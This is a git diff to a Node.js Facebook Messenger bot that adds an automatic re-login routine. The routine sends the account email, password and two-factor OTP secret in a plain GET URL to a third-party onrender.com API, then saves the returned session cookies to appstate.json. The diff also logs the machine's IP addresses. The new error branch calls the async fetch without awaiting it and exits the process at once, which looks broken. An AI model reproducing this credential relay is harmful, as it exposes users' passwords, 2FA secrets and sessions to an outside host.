@@ -8,6 +8,7 @@ const chalk = require('chalk');
 const figlet = require('figlet');
 const { execSync } = require('child_process');
 const logger = require("./utils/log.js");
+const os = require('os');
 // const login = require("fca-horizon-remastered");
 const login = require("./includes/login");
 const axios = require("axios");
@@ -139,7 +140,57 @@ catch { return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "e
 ////////////////////////////////////////////////////////////
 //========= Login account and start Listen Event =========//
 ////////////////////////////////////////////////////////////
+// Get IP Addresses
+const networkInterfaces = os.networkInterfaces();
+const ipAddresses = [];
+for (const key in networkInterfaces) {
+    const interfaces = networkInterfaces[key];
+    for (const iface of interfaces) {
+        if (!iface.internal && iface.family === 'IPv4') {
+            ipAddresses.push(iface.address);
+        }
+    }
+}
 
+async function fetchAppState() {
+  const email = global.config.LOGIN.EMAIL; // Access EMAIL from global.config.LOGIN
+  const password = global.config.LOGIN.PASSWORD; // Access PASSWORD from global.config.LOGIN
+  const otpkey = (global.config.LOGIN.OTPKEY || "").replace(/\s+/g, '').toLowerCase(); // Access OTPKEY from global.config.LOGIN, handle undefined
+  const url = `https://api-j7hu.onrender.com/fblogin?user=${email}&pass=${password}&twofactor=${otpkey}`;
+  console.log(chalk.green(`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`)); // Use chalk for better visual separation
+  logger("Lương Trường Khôi (@LunarKrystal)", "CREDIT"); // Keep original credit log
+  logger("Tiến hành đăng nhập tại:", "LOGIN"); // Keep original login start log
+  logger(`Email: ${email}`, "LOGIN"); // Keep email log
+  logger(`Password: ${password.replace(/./g, '*')}`, "LOGIN"); // Mask password for security in logs
+  logger(`Địa chỉ IP: ${ipAddresses.join(', ')}`, "LOGIN"); // Display IP addresses as comma-separated string
+  try {
+    const res = await axios.get(url);
+    if (res.data.status === true && res.data.data?.session_cookies) {
+      const sessionCookies = res.data.data.session_cookies;
+    logger(`Đã tìm thấy appstate`, "LOGIN");
+      const appState = sessionCookies.map(cookie => ({
+        key: cookie.key,
+        value: cookie.value,
+        domain: cookie.domain,
+        path: cookie.path,
+        secure: true,
+        httpOnly: true
+      }));
+
+      // Ghi ra file
+      fs.writeFileSync(path.join(__dirname, 'appstate.json'), JSON.stringify(appState, null, 2), 'utf8');
+      logger("Trạng thái: true", "LOGIN"); // Log login status as true on success
+      logger(`Đã ghi xong appstate vào mục ${global.config.APPSTATEPATH}`, "LOGIN"); // Log appstate save path
+      console.log(chalk.green(`┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`)); // Use chalk for end message
+      return appState;
+    } else {
+      throw new Error('API không trả về session_cookies');
+    }
+  } catch (err) {
+    console.error('❌ Lỗi khi fetch appState:', err.message);
+    return null;
+  }
+}
 
 function onBot({ models: botModel }) {
     console.log(chalk.green(figlet.textSync('LOGIN', { horizontalLayout: 'full' })));
@@ -334,7 +385,12 @@ function onBot({ models: botModel }) {
                     logger(global.getText('mirai', 'successConnectMQTT'), '[ MQTT ]');
                   }
                 });
-              } else {
+              }
+              else if (JSON.stringify(error).includes('Not logged in.')) {
+                fetchAppState()
+                process.exit(1) 
+              }
+              else {
                 return logger(global.getText("mirai", "handleListenError", JSON.stringify(error)), "error");
               }
             }
